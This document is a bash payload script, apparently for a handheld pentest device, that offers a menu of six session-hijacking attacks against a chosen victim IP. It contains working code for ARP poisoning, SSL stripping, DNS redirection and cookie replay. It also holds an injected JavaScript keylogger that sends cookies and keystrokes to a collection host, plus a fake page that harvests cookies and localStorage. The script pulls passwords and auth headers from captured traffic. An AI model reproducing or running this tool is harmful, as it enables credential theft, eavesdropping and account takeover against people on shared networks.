#!/bin/bash
# Title: Session Hijack
# Author: bad-antics
# Description: Active session hijacking with real-time injection and takeover capabilities
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/session-hijack"
mkdir -p "$LOOT_DIR"

PROMPT "SESSION HIJACK

Active session takeover
& injection framework.

Capabilities:
- TCP session hijacking
- HTTP session riding
- WebSocket hijacking
- Cookie injection
- SSL strip + hijack
- DNS-based session redirect

Press OK to configure."

PROMPT "HIJACK MODE

1. ARP + Session Steal
2. DNS Redirect Hijack
3. SSL Strip + Inject
4. WebSocket Intercept
5. Cookie Replay Attack
6. Full Active Hijack

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-6):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

INTERFACE=$(TEXT_PICKER "Interface:" "wlan0")

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION_LOG="$LOOT_DIR/sessions_${TIMESTAMP}.log"
INJECT_LOG="$LOOT_DIR/injections_${TIMESTAMP}.log"

GATEWAY=$(ip route | grep default | awk '{print $3}')

setup_mitm() {
    local victim="$1"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # ARP poison both directions
    arpspoof -i "$INTERFACE" -t "$victim" "$GATEWAY" &>/dev/null &
    echo $! > /tmp/arp1.pid
    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$victim" &>/dev/null &
    echo $! > /tmp/arp2.pid
    
    # iptables redirect
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null
}

cleanup_mitm() {
    kill $(cat /tmp/arp1.pid 2>/dev/null) 2>/dev/null
    kill $(cat /tmp/arp2.pid 2>/dev/null) 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -F 2>/dev/null
    rm -f /tmp/arp*.pid
}

monitor_sessions() {
    local pcap="$1" duration="$2"
    
    # Real-time session monitoring
    timeout "$duration" tshark -i "$INTERFACE" -w "$pcap" \
        -f "tcp port 80 or tcp port 443 or tcp port 8080" \
        -Y "http.cookie or http.set_cookie or http.authorization" \
        -T fields -e frame.time -e ip.src -e ip.dst -e http.host \
        -e http.cookie -e http.authorization 2>/dev/null | \
    while IFS=$'\t' read -r time src dst host cookie auth; do
        echo "[$(date +%H:%M:%S)] $src -> $host" >> "$SESSION_LOG"
        
        # Detect high-value sessions
        if echo "$cookie" | grep -qiP '(admin|root|session|auth)'; then
            echo "[HIGH-VALUE] $src -> $host: $cookie" >> "$SESSION_LOG"
            NOTIFICATION "High-value session: $src -> $host"
        fi
        
        [ -n "$auth" ] && echo "[AUTH] $src -> $host: $auth" >> "$SESSION_LOG"
    done
}

inject_payload() {
    local target_ip="$1"
    
    # Create injection HTML
    cat > /tmp/inject.html << 'INJECT'
<script>
(function(){
    var x=new XMLHttpRequest();
    x.open("GET","http://"+location.host+"/",true);
    x.onreadystatechange=function(){
        if(x.readyState==4){
            var img=new Image();
            img.src="http://192.168.1.1:8888/c?d="+btoa(document.cookie)+"&u="+btoa(location.href);
        }
    };
    x.send();
    // Keylogger
    document.addEventListener('keypress',function(e){
        var img=new Image();
        img.src="http://192.168.1.1:8888/k?k="+e.key+"&u="+btoa(location.href);
    });
})();
</script>
INJECT
    
    # Setup injection proxy
    if command -v mitmproxy &>/dev/null; then
        mitmproxy --mode transparent --set block_global=false \
            --script /tmp/inject_script.py -p 8080 &>/dev/null &
        echo $! > /tmp/mitm.pid
    fi
}

case $MODE in
    1) # ARP + Session Steal
        VICTIM=$(TEXT_PICKER "Victim IP:" "")
        DURATION=$(NUMBER_PICKER "Duration (min):" 10)
        
        resp=$(CONFIRMATION_DIALOG "ARP SESSION STEAL

Victim: $VICTIM
Gateway: $GATEWAY
Duration: ${DURATION}m

This will MITM the victim
and steal active sessions.

Press OK to hijack.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: ARP steal victim=$VICTIM"
        SPINNER_START "ARP poisoning..."
        setup_mitm "$VICTIM"
        SPINNER_STOP
        
        PCAP="/tmp/hijack_${TIMESTAMP}.pcap"
        SPINNER_START "Intercepting sessions..."
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            "host $VICTIM and (tcp port 80 or tcp port 443 or tcp port 8080)" 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Extracting sessions..."
        # Pull cookies
        tshark -r "$PCAP" -Y "http.cookie" -T fields \
            -e ip.src -e http.host -e http.cookie 2>/dev/null | sort -u >> "$SESSION_LOG"
        # Pull auth headers
        tshark -r "$PCAP" -Y "http.authorization" -T fields \
            -e ip.src -e http.host -e http.authorization 2>/dev/null | sort -u >> "$SESSION_LOG"
        # Pull form data
        tshark -r "$PCAP" -Y "http.request.method == POST" -T fields \
            -e ip.src -e http.host -e http.request.uri -e http.file_data 2>/dev/null | \
            grep -i "pass\|user\|login\|auth\|token" >> "$SESSION_LOG"
        SPINNER_STOP
        
        cleanup_mitm
        rm -f "$PCAP"
        ;;
        
    2) # DNS Redirect Hijack
        TARGET_DOMAIN=$(TEXT_PICKER "Domain to hijack:" "")
        REDIRECT_IP=$(TEXT_PICKER "Redirect to:" "$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)")
        DURATION=$(NUMBER_PICKER "Duration (min):" 10)
        
        resp=$(CONFIRMATION_DIALOG "DNS REDIRECT

Domain: $TARGET_DOMAIN
Redirect: $REDIRECT_IP
Duration: ${DURATION}m

Press OK to hijack.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: DNS redirect domain=$TARGET_DOMAIN"
        
        # Setup fake DNS
        echo "$REDIRECT_IP $TARGET_DOMAIN" >> /etc/hosts
        
        # Setup capture server
        mkdir -p /tmp/hijack_web
        cat > /tmp/hijack_web/index.html << PHISH
<!DOCTYPE html>
<html>
<head><title>$TARGET_DOMAIN</title></head>
<body>
<script>
fetch('/capture', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: location.href,
        referrer: document.referrer,
        localStorage: JSON.stringify(localStorage)
    })
});
</script>
<h1>Please wait...</h1>
</body>
</html>
PHISH
        
        SPINNER_START "DNS hijack active..."
        cd /tmp/hijack_web
        python3 -m http.server 80 &>/dev/null &
        HTTP_PID=$!
        
        # Capture redirected traffic
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "/tmp/dns_hijack.pcap" \
            "host $REDIRECT_IP and tcp port 80" 2>/dev/null
        
        kill $HTTP_PID 2>/dev/null
        sed -i "/$TARGET_DOMAIN/d" /etc/hosts
        SPINNER_STOP
        
        tshark -r "/tmp/dns_hijack.pcap" -Y "http" -T fields \
            -e ip.src -e http.host -e http.cookie 2>/dev/null >> "$SESSION_LOG"
        rm -f /tmp/dns_hijack.pcap
        ;;
        
    3) # SSL Strip
        VICTIM=$(TEXT_PICKER "Victim IP:" "")
        DURATION=$(NUMBER_PICKER "Duration (min):" 10)
        
        resp=$(CONFIRMATION_DIALOG "SSL STRIP + INJECT

Victim: $VICTIM
Duration: ${DURATION}m

Downgrades HTTPS to HTTP
and injects capture code.

Press OK to launch.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: SSLstrip victim=$VICTIM"
        
        setup_mitm "$VICTIM"
        
        SPINNER_START "SSL stripping..."
        if command -v sslstrip &>/dev/null; then
            sslstrip -l 8080 -w "$SESSION_LOG" &>/dev/null &
            STRIP_PID=$!
            
            timeout $((DURATION * 60)) tail -f "$SESSION_LOG" &>/dev/null
            
            kill $STRIP_PID 2>/dev/null
        else
            # Manual SSL strip via iptables
            timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "/tmp/sslstrip.pcap" \
                "host $VICTIM" 2>/dev/null
            tshark -r "/tmp/sslstrip.pcap" -Y "http" -T fields \
                -e ip.src -e http.host -e http.cookie -e http.authorization 2>/dev/null >> "$SESSION_LOG"
            rm -f /tmp/sslstrip.pcap
        fi
        SPINNER_STOP
        
        cleanup_mitm
        ;;
        
    4) # WebSocket intercept
        TARGET=$(TEXT_PICKER "Target host:" "")
        PORT=$(NUMBER_PICKER "WS port:" 8080)
        DURATION=$(NUMBER_PICKER "Duration (min):" 10)
        
        resp=$(CONFIRMATION_DIALOG "WEBSOCKET HIJACK

Target: $TARGET:$PORT
Duration: ${DURATION}m

Press OK to intercept.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: WebSocket target=$TARGET:$PORT"
        SPINNER_START "WebSocket interception..."
        
        timeout $((DURATION * 60)) tshark -i "$INTERFACE" \
            -Y "websocket" -T fields \
            -e ip.src -e ip.dst -e websocket.payload.text 2>/dev/null | \
        while IFS=$'\t' read -r src dst payload; do
            echo "[WS $(date +%H:%M:%S)] $src -> $dst: $payload" >> "$SESSION_LOG"
            echo "$payload" | grep -qiP '(token|auth|session|password|key)' && \
                echo "[WS-HIGH] $payload" >> "$INJECT_LOG"
        done
        
        SPINNER_STOP
        ;;
        
    5) # Cookie replay
        COOKIE_SRC=$(TEXT_PICKER "Cookie file:" "$LOOT_DIR/")
        TARGET_URL=$(TEXT_PICKER "Target URL:" "https://")
        
        if [ ! -f "$COOKIE_SRC" ]; then
            ERROR_DIALOG "Cookie file not found!"
            exit 1
        fi
        
        resp=$(CONFIRMATION_DIALOG "COOKIE REPLAY

Source: $(basename "$COOKIE_SRC")
Target: $TARGET_URL

Will replay stolen cookies
to hijack active sessions.

Press OK to replay.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: cookie replay target=$TARGET_URL"
        SPINNER_START "Replaying sessions..."
        
        while IFS= read -r line; do
            COOKIE=$(echo "$line" | grep -oP '(PHPSESSID|JSESSIONID|session|token|auth)[^\s;]+')
            [ -z "$COOKIE" ] && continue
            
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "Cookie: $COOKIE" "$TARGET_URL" 2>/dev/null)
            
            if [ "$RESPONSE" = "200" ]; then
                BODY=$(curl -s -H "Cookie: $COOKIE" "$TARGET_URL" 2>/dev/null)
                echo "[REPLAY SUCCESS] Cookie: $COOKIE" >> "$SESSION_LOG"
                echo "[REPLAY SUCCESS] Response: ${BODY:0:200}" >> "$SESSION_LOG"
                
                # Check if we're authenticated
                echo "$BODY" | grep -qiP '(logout|dashboard|profile|admin|welcome)' && \
                    echo "[HIJACKED] Authenticated session via $COOKIE" >> "$SESSION_LOG"
            fi
        done < "$COOKIE_SRC"
        
        SPINNER_STOP
        ;;
        
    6) # Full active hijack
        VICTIM=$(TEXT_PICKER "Victim IP:" "")
        DURATION=$(NUMBER_PICKER "Duration (min):" 15)
        
        resp=$(CONFIRMATION_DIALOG "FULL SESSION HIJACK

Victim: $VICTIM
Gateway: $GATEWAY
Duration: ${DURATION}m

ARP poison + SSL strip +
Cookie steal + Injection

Press OK to launch.")
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
        
        LOG "SessionHijack: full hijack victim=$VICTIM"
        
        SPINNER_START "Setting up MITM..."
        setup_mitm "$VICTIM"
        SPINNER_STOP
        
        PCAP="/tmp/full_hijack_${TIMESTAMP}.pcap"
        
        SPINNER_START "Full hijack active..."
        # Capture everything
        tcpdump -i "$INTERFACE" -w "$PCAP" "host $VICTIM" &>/dev/null &
        TCPDUMP_PID=$!
        
        # Real-time extraction
        tshark -i "$INTERFACE" -Y "http.cookie or http.authorization or http.set_cookie" \
            -T fields -e frame.time_relative -e ip.src -e ip.dst \
            -e http.host -e http.request.uri -e http.cookie \
            -e http.authorization -e http.set_cookie 2>/dev/null | \
        while IFS=$'\t' read -r time src dst host uri cookie auth setcookie; do
            echo "[${time}s] $src -> $host$uri" >> "$SESSION_LOG"
            [ -n "$cookie" ] && echo "  Cookie: $cookie" >> "$SESSION_LOG"
            [ -n "$auth" ] && echo "  Auth: $auth" >> "$SESSION_LOG"
            [ -n "$setcookie" ] && echo "  Set-Cookie: $setcookie" >> "$SESSION_LOG"
        done &
        TSHARK_PID=$!
        
        sleep $((DURATION * 60))
        
        kill $TCPDUMP_PID $TSHARK_PID 2>/dev/null
        wait 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Post-processing..."
        # Extract form submissions (credentials)
        tshark -r "$PCAP" -Y "http.request.method == POST" -T fields \
            -e http.host -e http.request.uri -e http.file_data 2>/dev/null | \
            grep -i "pass\|user\|login\|email\|token" >> "$INJECT_LOG"
        
        # Extract file downloads
        tshark -r "$PCAP" -Y "http.content_type contains \"application\"" -T fields \
            -e http.host -e http.request.uri -e http.content_type 2>/dev/null >> "$INJECT_LOG"
        SPINNER_STOP
        
        cleanup_mitm
        rm -f "$PCAP"
        ;;
esac

# Results
SESSIONS=$(wc -l < "$SESSION_LOG" 2>/dev/null || echo 0)
INJECTIONS=$(wc -l < "$INJECT_LOG" 2>/dev/null || echo 0)

if [ "$SESSIONS" -gt 0 ] || [ "$INJECTIONS" -gt 0 ]; then
    PREVIEW=$(head -15 "$SESSION_LOG" 2>/dev/null)
    PROMPT "SESSIONS HIJACKED!

Captured: $SESSIONS entries
High-value: $INJECTIONS items

$PREVIEW

Saved to session-hijack/

Press OK to exit."
    NOTIFICATION "SessionHijack: $SESSIONS sessions captured"
else
    PROMPT "NO SESSIONS

No active sessions captured
in the monitoring window.

Try:
- Longer duration
- Full active mode
- Target active users

Press OK to exit."
fi
